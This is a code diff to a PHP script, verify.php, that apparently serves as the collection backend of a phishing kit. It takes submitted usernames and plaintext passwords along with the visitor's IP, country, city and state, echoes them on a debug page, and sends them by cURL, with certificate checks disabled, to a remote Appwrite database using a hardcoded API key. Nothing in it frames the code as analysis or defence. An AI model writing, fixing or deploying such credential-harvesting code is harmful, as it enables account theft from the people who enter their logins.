@@ -1,7 +1,11 @@
 <?php
 // ============================================
-// VERIFY.PHP - SIMPLE VERSION
+// VERIFY.PHP - FINAL WORKING VERSION
 // ============================================
+
+// Enable error reporting
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
 // Get data
 $u = $_GET['u'] ?? '';
@@ -18,48 +22,65 @@ $apiKey = 'standard_ea3534c309f3d66752d8bfcb09702bb24ca55396f2283e8b7a9c2d30fb63
 $databaseId = '6a4056fe0011aa4462d6';
 $collectionId = '6a4057910024491b6393';
 
-// Build data
-$data = [
-    'username' => $u,
-    'password' => $p,
-    'ip' => $ip,
-    'country' => $country,
-    'city' => $city,
-    'state' => $state,
-    'timestamp' => date('Y-m-d H:i:s')
-];
+echo "<h1>🔍 Debug - verify.php</h1>";
+
+// Show received data
+echo "<h2>Received Data:</h2>";
+echo "Username: " . htmlspecialchars($u) . "<br>";
+echo "Password: " . htmlspecialchars($p) . "<br>";
+echo "IP: " . htmlspecialchars($ip) . "<br>";
+echo "Country: " . htmlspecialchars($country) . "<br>";
+echo "City: " . htmlspecialchars($city) . "<br>";
+
+// Build data - ONLY include fields that exist in your table
+$data = [];
+if (!empty($u)) $data['username'] = $u;
+if (!empty($p)) $data['password'] = $p;
+if (!empty($ip)) $data['ip'] = $ip;
+if (!empty($country)) $data['country'] = $country;
+if (!empty($city)) $data['city'] = $city;
+if (!empty($state)) $data['state'] = $state;
+$data['timestamp'] = date('Y-m-d H:i:s');
+
+echo "<h2>Data to send:</h2>";
+echo "<pre>" . json_encode($data, JSON_PRETTY_PRINT) . "</pre>";
 
 $url = "$endpoint/databases/$databaseId/collections/$collectionId/documents";
+echo "<h2>URL:</h2>";
+echo "<code>$url</code><br><br>";
 
-// Send via file_get_contents (fallback)
-$options = [
-    'http' => [
-        'method' => 'POST',
-        'header' => "Content-Type: application/json\r\n" .
-                    "X-Appwrite-Project: $projectId\r\n" .
-                    "X-Appwrite-Key: $apiKey\r\n",
-        'content' => json_encode($data),
-        'ignore_errors' => true
-    ]
-];
+// Send via cURL
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Content-Type: application/json',
+    'X-Appwrite-Project: ' . $projectId,
+    'X-Appwrite-Key: ' . $apiKey
+]);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
-$context = stream_context_create($options);
-$result = @file_get_contents($url, false, $context);
+$result = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$error = curl_error($ch);
+curl_close($ch);
 
-// Show what happened
-echo "<h1>Debug</h1>";
-echo "Data sent: " . json_encode($data) . "<br><br>";
-echo "URL: $url<br><br>";
-echo "Result: " . htmlspecialchars($result) . "<br><br>";
+echo "<h2>Response:</h2>";
+echo "HTTP Code: $httpCode<br>";
 
-if ($result === false) {
-    echo "❌ Failed to send! Check API key and permissions.";
-} else {
+if ($result) {
+    echo "<pre style='background:#f0f0f0;padding:15px;border-radius:5px;overflow:auto;max-height:300px;'>";
+    echo htmlspecialchars($result);
+    echo "</pre>";
+    
+    // Check if successful
     $response = json_decode($result, true);
     if (isset($response['$id'])) {
-        echo "✅ Success! Document ID: " . $response['$id'];
-    } else {
-        echo "❌ Error: " . htmlspecialchars($result);
+        echo "<p style='color:green;font-size:18px;'>✅ SUCCESS! Document ID: " . $response['$id'] . "</p>";
     }
+} else {
+    echo "<p style='color:red;'>❌ Error: " . htmlspecialchars($error) . "</p>";
 }
 ?>
